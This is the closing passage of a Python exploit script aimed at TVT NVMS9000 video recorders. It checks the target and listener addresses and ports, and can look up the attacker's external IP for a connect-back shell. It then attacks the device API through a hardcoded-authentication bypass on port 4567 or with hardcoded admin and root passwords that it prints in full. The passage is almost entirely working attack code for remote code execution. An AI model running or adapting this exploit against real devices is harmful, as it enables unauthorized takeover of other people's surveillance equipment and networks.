		lhost = args.lhost
	elif args.autoip:
		# HTTP check of our external IP
		try:

			headers = {
				'Connection': 'close',
				'Accept'	:	'gzip, deflate',
				'Accept-Language'	:	'en-US,en;q=0.8',
				'Cache-Control'	:	'max-age=0',
				'User-Agent':'ApiTool'
				}

			print "[>] Trying to find out my external IP"
			lhost = HTTPconnect("whatismyip.akamai.com",proto,verbose,credentials,False,noexploit).Send("/",headers,None,None)
			if verbose:
				print "[Verbose] Detected my external IP:",lhost
		except Exception as e:
			print "[<] ",e
			sys.exit(1)

	# Check if RPORT is valid
	if not Validate(verbose).Port(rport):
		print "[!] Invalid RPORT - Choose between 1 and 65535"
		sys.exit(1)

	# Check if LPORT is valid
	if not Validate(verbose).Port(lport):
		print "[!] Invalid LPORT - Choose between 1 and 65535"
		sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate(verbose).Host(rhost)
	if not rhost:
		print "[!] Invalid RHOST"
		sys.exit(1)

	# Check if LHOST is valid IP or FQDN, get IP back
	lhost = Validate(verbose).Host(lhost)
	if not lhost:
		print "[!] Invalid LHOST"
		sys.exit(1)

#
# Validation done, start print out stuff to the user
#
	if args.https:
		print "[i] HTTPS / SSL Mode Selected"
	print "[i] Remote target IP:",rhost
	print "[i] Remote target PORT:",rport
	if cmd == 'RCE':
		print "[i] Connect back IP:",lhost
		print "[i] Connect back PORT:",lport


	#
	# HTTP API with hardcoded authentication on TCP/4567 to NVMS9000 (bypass of ConfigSyncProc)
	#
	if args.rport == '4567':
		print "[!] Be aware that remote HTTP/HTTPS access will not work until reboot!"
		TVT(rhost,rport,proto,verbose,credentials,raw_request,noexploit,headers).APIConfigClient(lhost, lport, cmd, request)

	#
	# HTTP/HTTPS API with hardcoded password (ConfigSyncProc)
	# admin:{12213BD1-69C7-4862-843D-260500D1DA40}
	else:
		print "[!] Trying w/ credentials: {}".format(credentials)
		if not(TVT(rhost,rport,proto,verbose,credentials,raw_request,noexploit,headers).APIConfigClient(lhost, lport, cmd, request)):
			credentials = 'root:{12213BD1-69C7-4862-843D-260500D1DA40}'
			print "[!] Trying w/ credentials: {}".format(credentials)
			TVT(rhost,rport,proto,verbose,credentials,raw_request,noexploit,headers).APIConfigClient(lhost, lport, cmd, request)
	print "[i] All done"


# [EOF]

